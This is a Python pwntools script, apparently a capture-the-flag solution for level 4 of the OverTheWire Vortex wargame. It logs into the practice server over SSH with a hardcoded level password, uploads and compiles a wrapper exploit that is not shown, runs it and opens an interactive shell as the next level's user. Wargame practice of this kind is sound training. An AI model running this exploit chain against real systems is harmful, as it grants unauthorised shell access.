#!/usr/bin/python3
from pwn import *
import os
import time

#Level information for ssh
level = 4
USER = 'vortex%s' % level
HOST = 'vortex.labs.overthewire.org'
PASS = '2YmgK1=jw'
PORT = 2228

def connect_to_level():
    sh = ssh(user=USER, host=HOST, password=PASS, port=PORT)
    return sh

def setup_payload(sh):
    shell = sh.run('/bin/bash')
    w = log.progress("Creating /tmp/tald4")
    shell.sendline(b'mkdir /tmp/tald4')
    shell.sendline(b'cd /tmp/tald4')
    sh.set_working_directory(b'/tmp/tald4')
    w.success("Created")
    time.sleep(0.05)
    sh.upload_file("./serverwrapper.c")
    time.sleep(0.05)
    w = log.progress("Compiling vortex 4 wrapper...")
    shell.sendline("gcc -m32 /tmp/tald4/serverwrapper.c -o /tmp/tald4/pwn")
    w.success("compiled")

def execute_payload(sh):
    time.sleep(0.05)
    w = log.progress("Executing vortex 4 wrapper...")
    shell = sh.run(b'/tmp/tald4/pwn ')
    w.success("vortex5 shell established")
    shell.interactive()

sh = connect_to_level()
setup_payload(sh)
execute_payload(sh)
